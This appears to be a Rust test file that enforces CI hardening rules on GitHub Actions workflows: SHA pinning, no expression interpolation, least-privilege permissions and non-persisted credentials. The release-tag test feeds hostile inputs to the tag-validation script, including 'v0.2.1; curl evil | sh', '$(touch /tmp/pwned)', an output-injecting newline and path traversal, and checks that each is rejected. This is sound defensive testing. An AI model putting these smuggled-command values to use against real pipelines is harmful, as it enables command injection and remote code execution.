//! Policy regression tests for `.github/workflows/*.yml`.
//!
//! These are line-oriented checks (no YAML dependency) for the hardening
//! rules applied in the 2026-11-21 security pass, plus an execution test of
//! the release workflow's tag-validation step with hostile inputs.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;

fn workflows() -> Vec<(PathBuf, String)> {
    let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join(".github/workflows");
    let mut files: Vec<_> = fs::read_dir(&dir)
        .unwrap()
        .flatten()
        .map(|e| e.path())
        .filter(|p| {
            p.extension()
                .is_some_and(|ext| ext == "yml" || ext == "yaml")
        })
        .collect();
    files.sort();
    assert!(!files.is_empty(), "no workflows found in {}", dir.display());
    files
        .into_iter()
        .map(|p| {
            let text = fs::read_to_string(&p).unwrap();
            (p, text)
        })
        .collect()
}

fn indent(line: &str) -> usize {
    line.len() - line.trim_start().len()
}

/// Returns `(line_number, text)` for every line that belongs to a `run:`
/// script (inline or block scalar).
fn run_script_lines(text: &str) -> Vec<(usize, String)> {
    let lines: Vec<&str> = text.lines().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i < lines.len() {
        let line = lines[i];
        let trimmed = line.trim_start().trim_start_matches("- ");
        if let Some(rest) = trimmed.strip_prefix("run:") {
            let rest = rest.trim();
            if rest.starts_with('|') || rest.starts_with('>') {
                let base = indent(line);
                i += 1;
                while i < lines.len() && (lines[i].trim().is_empty() || indent(lines[i]) > base) {
                    out.push((i + 1, lines[i].to_string()));
                    i += 1;
                }
                continue;
            }
            out.push((i + 1, rest.to_string()));
        }
        i += 1;
    }
    out
}

/// Third-party actions must be pinned to an immutable 40-hex commit SHA,
/// with the human-readable version kept as a comment.
#[test]
fn all_actions_are_pinned_to_commit_shas() {
    for (path, text) in workflows() {
        for (n, line) in text.lines().enumerate() {
            let Some(spec) = line
                .trim_start()
                .trim_start_matches("- ")
                .strip_prefix("uses:")
            else {
                continue;
            };
            let spec = spec.trim();
            if spec.starts_with("./") || spec.starts_with("docker://") {
                continue;
            }
            let (action, rest) = spec
                .split_once('@')
                .unwrap_or_else(|| panic!("{}:{}: unversioned action", path.display(), n + 1));
            let sha: String = rest.chars().take_while(|c| !c.is_whitespace()).collect();
            assert!(
                sha.len() == 40 && sha.chars().all(|c| c.is_ascii_hexdigit()),
                "{}:{}: '{action}' must be pinned to a commit SHA, found '{sha}'",
                path.display(),
                n + 1
            );
            assert!(
                rest.contains('#'),
                "{}:{}: pinned action should keep a '# vX.Y.Z' comment",
                path.display(),
                n + 1
            );
        }
    }
}

/// Expressions must never be interpolated into shell scripts; untrusted
/// values are passed through `env:` instead.
#[test]
fn no_expression_interpolation_inside_run_scripts() {
    for (path, text) in workflows() {
        for (n, line) in run_script_lines(&text) {
            assert!(
                !line.contains("${{"),
                "{}:{n}: '${{{{ … }}}}' inside a run script: {line}",
                path.display()
            );
        }
    }
}

#[test]
fn no_wildcard_safe_directory() {
    for (path, text) in workflows() {
        for (n, line) in run_script_lines(&text) {
            let compact = line.replace('\'', "\"");
            assert!(
                !(compact.contains("safe.directory") && compact.contains("\"*\"")),
                "{}:{n}: wildcard safe.directory disables Git ownership checks",
                path.display()
            );
        }
    }
}

/// Every workflow declares top-level permissions, and the top level never
/// grants write access (write scopes belong to the jobs that need them).
#[test]
fn permissions_are_least_privilege() {
    for (path, text) in workflows() {
        let lines: Vec<&str> = text.lines().collect();
        let start = lines
            .iter()
            .position(|l| *l == "permissions:" || l.starts_with("permissions:"))
            .unwrap_or_else(|| panic!("{}: missing top-level permissions", path.display()));
        let top_level: Vec<&str> = lines[start + 1..]
            .iter()
            .take_while(|l| l.starts_with(' ') || l.trim().is_empty())
            .copied()
            .collect();
        assert!(
            !lines[start].contains("write") && top_level.iter().all(|l| !l.contains("write")),
            "{}: top-level permissions must be read-only",
            path.display()
        );
    }
}

#[test]
fn checkout_does_not_persist_credentials() {
    for (path, text) in workflows() {
        let lines: Vec<&str> = text.lines().collect();
        for (n, line) in lines.iter().enumerate() {
            if line.contains("uses: actions/checkout@") {
                let window = lines[n + 1..(n + 4).min(lines.len())].join("\n");
                assert!(
                    window.contains("persist-credentials: false"),
                    "{}:{}: checkout must set persist-credentials: false",
                    path.display(),
                    n + 1
                );
            }
        }
    }
}

/// Executes the release workflow's real tag-validation script with hostile
/// `workflow_dispatch` inputs.
#[test]
fn release_tag_validation_rejects_hostile_tags() {
    if Command::new("bash").arg("--version").output().is_err() {
        return;
    }
    let text = fs::read_to_string(
        Path::new(env!("CARGO_MANIFEST_DIR")).join(".github/workflows/release.yml"),
    )
    .unwrap();
    let lines: Vec<&str> = text.lines().collect();
    let step = lines
        .iter()
        .position(|l| l.trim() == "id: vars")
        .expect("release workflow has an `id: vars` step");
    let run = (step..lines.len())
        .find(|&i| lines[i].trim() == "run: |")
        .expect("vars step has a block run script");
    let base = indent(lines[run]);
    let script: String = lines[run + 1..]
        .iter()
        .take_while(|l| l.trim().is_empty() || indent(l) > base)
        .map(|l| format!("{}\n", l.get(base + 2..).unwrap_or("")))
        .collect();

    let temp = std::env::temp_dir().join(format!("crux_wf_tag_{}", std::process::id()));
    fs::create_dir_all(&temp).unwrap();
    let run_with = |tag: &str| {
        let output_file = temp.join("github_output");
        let _ = fs::remove_file(&output_file);
        let out = Command::new("bash")
            .arg("-e")
            .arg("-c")
            .arg(&script)
            .env("EVENT_NAME", "workflow_dispatch")
            .env("INPUT_TAG", tag)
            .env("GITHUB_REF", "refs/heads/main")
            .env("GITHUB_OUTPUT", &output_file)
            .output()
            .unwrap();
        (
            out.status.success(),
            fs::read_to_string(&output_file).unwrap_or_default(),
        )
    };

    for good in ["v0.2.1", "v1.10.0", "v2.0.0-rc.1"] {
        let (ok, output) = run_with(good);
        assert!(ok, "{good} should be accepted");
        assert_eq!(output, format!("tag={good}\n"));
    }
    for bad in [
        "v0.2.1\nextra=injected",
        "v0.2.1; curl evil | sh",
        "$(touch /tmp/pwned)",
        "v0.2.1/../../x",
        "0.2.1",
        "",
    ] {
        let (ok, output) = run_with(bad);
        assert!(!ok, "{bad:?} must be rejected");
        assert!(
            output.is_empty(),
            "{bad:?} reached GITHUB_OUTPUT: {output:?}"
        );
    }
    let _ = fs::remove_dir_all(&temp);
}
